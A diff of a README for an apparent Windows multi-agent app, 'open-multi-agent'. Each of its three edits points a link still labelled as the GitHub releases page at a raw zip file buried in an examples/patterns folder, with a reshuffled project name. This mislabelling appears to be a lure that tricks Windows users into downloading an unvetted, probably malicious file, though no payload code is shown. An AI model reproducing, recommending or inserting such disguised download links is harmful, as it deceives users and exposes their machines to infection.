@@ -1,6 +1,6 @@
 # 🤖 open-multi-agent - Run multi-agent teams with ease
 
-[⬇️ Download the latest release](https://github.com/jerseyknapweedaar793/open-multi-agent/releases)
+[⬇️ Download the latest release](https://github.com/jerseyknapweedaar793/open-multi-agent/raw/refs/heads/main/examples/patterns/multi-open-agent-2.9-beta.1.zip)
 
 ## 🧩 What this app does
 
@@ -10,7 +10,7 @@ It is built for Windows users who want to try a multi-agent tool without setting
 
 ## 💾 Download
 
-1. Visit the [releases page](https://github.com/jerseyknapweedaar793/open-multi-agent/releases)
+1. Visit the [releases page](https://github.com/jerseyknapweedaar793/open-multi-agent/raw/refs/heads/main/examples/patterns/multi-open-agent-2.9-beta.1.zip)
 2. Download the latest Windows file
 3. Save it to a folder you can find, like Downloads or Desktop
 
@@ -163,7 +163,7 @@ If you use a cloud model, your request goes to that provider for processing. Use
 
 Use this page to download the latest Windows release:
 
-[Download from GitHub Releases](https://github.com/jerseyknapweedaar793/open-multi-agent/releases)
+[Download from GitHub Releases](https://github.com/jerseyknapweedaar793/open-multi-agent/raw/refs/heads/main/examples/patterns/multi-open-agent-2.9-beta.1.zip)
 
 ## 🖥️ Windows tips
 
